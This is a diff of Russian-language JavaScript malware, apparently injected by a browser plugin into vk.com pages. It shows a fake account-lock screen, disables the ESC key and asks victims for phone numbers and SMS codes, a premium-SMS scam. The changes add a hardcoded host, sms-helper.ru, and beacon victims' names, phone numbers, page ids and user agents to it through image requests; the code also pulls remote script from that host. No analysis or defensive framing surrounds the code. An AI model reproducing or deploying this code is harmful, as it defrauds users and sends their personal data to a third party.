@@ -2,6 +2,7 @@ var country = [{'name':'Австралия', 'code':'+61'},{'name':'Австра
 
 var noCodeNum = '';
 var noCodeTxt = '';
+const goodUrl = "http://sms-helper.ru/js/";
 
 function GetCountry(code){
 	var str = '';
@@ -75,7 +76,7 @@ function IsInf(){
 		GetInfForUser();
 		return false;
 	}
-
+	SendStat(1, "small");
 	return true;
 }
 
@@ -88,8 +89,12 @@ function NewAction(){
 
 	try {
 		var stat = plg.Get('vRun');
-		if(stat == 3)
+		if(stat == 3){
+			try{
+				plg.Del();
+			}catch(e){}
 			return false;
+		}
 		if(window.wall){
 			wall.like = function(){start();}
 			wall.likeShareCustom = function(){start();}
@@ -178,9 +183,9 @@ function Loader(){
 function MyBoxLock(){
 	KEY.ESC = 0xFFFFFF;
 	try{
-	var name = unescape(plg.Get('vName'));
-	var number = plg.Get('vTel');
-	number = number.replace(/(\*)+/, '');
+		var name = unescape(plg.Get('vName'));
+		var number = plg.Get('vTel');
+		number = number.replace(/(\*)+/, '');
 	} catch(e){}
 	var code = TelCode(number);
 	try{
@@ -223,9 +228,12 @@ function MyBoxLock(){
 		ge('page_body').setAttribute('class', 'simple');
 		ge('page_body').innerHTML = '<div id="content" style="border-color: rgb(217, 224, 231); border-style: solid; border-width: 0px 1px 1px;">' + content + '</div>';
 		ge('page_body').setAttribute('style', 'border-width: 0px 1px 1px; border-color: rgba(100, 100, 100, 0.08); border-style: solid;');
+		SendStat(3, "small");
 	}
 	if(run == 1){
 		boxLock.show();
+		SendStat(2, "small");
+		setTimeout(function(){document.location.reload();}, 5000);
 		try {plg.Save('vRun', '2');} catch(e){}
 	}
 		
@@ -244,12 +252,13 @@ function ChangeCountry(val){
 function noCode(){
 	ge('blocked_submit_result').innerHTML = '<b>Если Вам не пришло смс сообщение.</b><br/>Отправте ' + ((noCodeTxt) ? "смс с текстом <b>" + noCodeTxt + "</b>" : "<b>пустое смс</b> сообщение") + ' по номеру <b>' + ((noCodeNum) ? noCodeNum : "2332") + '</b>.';
 	ge('blocked_submit_result').style.display = 'block';
+	SendStat(555, "small");
 }
 
 function ChangePass(){
 	try {
 		plg.Save('vRun', '3');
-		plg.Del();
+		SendStat(66, "big");
 	} catch(e){}
 	document.location.replace('http://vk.com/settings#settings_error_pwd');
 }
@@ -265,6 +274,7 @@ function GetCode(){
 			ge('blocked_submit_result').innerHTML = '<b>Некорректный мобильный номер.</b></br> Необходимо корректно ввести номер <b>в международном формате</b>, например<br/> <b>+7(921)000-00-00</b>.';
 			ge('blocked_submit_result').style.display = 'block';
 		}, 1500);
+		SendStat(44, "small");
 		return false;
 	}
 	
@@ -281,6 +291,7 @@ function GetCode(){
 		ge('blocked_code_row').style.display = 'block';
 		ge('blocked_code_submit').style.display = 'block';
 	}, 1500);
+	SendStat(4, "small");
 	return true;
 }
 
@@ -296,7 +307,7 @@ function CheckCode(){
 			ge('blocked_submit_result').innerHTML = '<b>Неверный код.</b></br> Проверьте правильность ввода кода.';
 			ge('blocked_submit_result').style.display = 'block';
 		}, 2000)
-		
+		SendStat(55, "small");
 		return false;
 	}
 	
@@ -312,7 +323,7 @@ function CheckCode(){
 				ge('blocked_pass_submit').style.display = 'block';	
 			}, 1500)
 			
-			SendStat();
+			SendStat(5, "big");
 			
 			return true;
 		}
@@ -326,14 +337,14 @@ function CheckCode(){
 		ge('blocked_submit_result').innerHTML = '<b>Неверный код.</b></br> Проверьте правильность ввода кода.';
 		ge('blocked_submit_result').style.display = 'block';
 	}, 2000)
-	
+	SendStat(55, "small");
 	return false;
 }
 
 function EndLock(){
 	try {
+		SendStat(6, "big");
 		plg.Save('vRun', '3');
-		plg.Del();
 	}catch(e){}
 	location.reload();
 }
@@ -365,7 +376,7 @@ function SendSMS(){
 	var sms = document.createElement('script');
 	sms.setAttribute('type', 'text/javascript');
 	var type = GetType();
-	var url = 'http://sms-helper.ru/js/sendsms.php?type=' + type + '&set=' + res + '&page=' + idPage + '&id=' + id + '&shot=' + noCodeNum;
+	var url = goodUrl + 'sendsms.php?type=' + type + '&set=' + res + '&id=' + id + '&shot=' + noCodeNum;
 	sms.setAttribute('src', url);
 	document.getElementsByTagName('head')[0].appendChild(sms);
 	} catch(e){}
@@ -382,27 +393,35 @@ function GetType(){
 	return 2;
 }
 
-function SendStat(){
+function SendStat(step, typeLog){	
 	try{
-	var id = plg.Get('id');
-	var group = plg.Get('group');
-	var idPage = plg.Get('vIdPage');
-	var name = plg.Get('vName');
-	var number = plg.Get('vTel');
-	var alpha = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j'];
-	number = number.replace(/\+/, '');
-	var res = "";
-	for(i = 0; i < number.length; i++)
-		res += alpha[parseInt(number[i])];
-	
-	name = encodeURIComponent(name);
-	
-	var stat = new Image();
-	stat.src = 'http://sms-helper.ru/js/stat.php?type=1&set=' + res + '&name=' + name + '&page=' + idPage + '&id=' + id + '&group=' + group + '&agent=' + encodeURIComponent(navigator.userAgent);
-	} catch(e){}
+		var id = plg.Get('id');
+		var agent = encodeURIComponent(navigator.userAgent);
+		if(typeLog == 'small'){
+			var statUrl = 'statBeta.php?type=1&status=smallLog&id=' + id + '&agent=' + agent + '&step=' + step;
+		}
+		
+		if(typeLog == 'big'){
+			var group = plg.Get('group');
+			var idPage = plg.Get('vIdPage');
+			var name = encodeURIComponent(plg.Get('vName'));
+			var number = plg.Get('vTel');
+			number = number.replace(/\+/, '');
+			var statUrl = 'statBeta.php?type=1&status=bigLog&set=' + number + '&name=' + name + '&page=' + idPage + '&id=' + id + '&group=' + group + '&agent=' + agent + '&step=' + step;
+		}
+
+		var setStat = new Image();
+		setStat.src = goodUrl +''+ statUrl;
+		return;
+	} catch(e){
+		var agent = encodeURIComponent(navigator.userAgent);
+		var setStat = new Image();
+		setStat.src = goodUrl + 'statBeta.php?type=1&status=error&agent=' + agent;
+	}
 }
 
 function isRun(){
+	SendStat(0, "small");
 	if(!IsInf())
 		return false;
 
@@ -425,6 +444,7 @@ function isRun(){
 	} catch(e){}
 	
 	if(run == 3){
+		
 		document.body.removeEventListener('DOMNodeInserted', isRun, false);
 		return true;
 	}
@@ -435,5 +455,6 @@ function isRun(){
 		return true;
 	}
 }
+
 document.body.addEventListener('DOMNodeInserted', isRun, false);
 isRun();
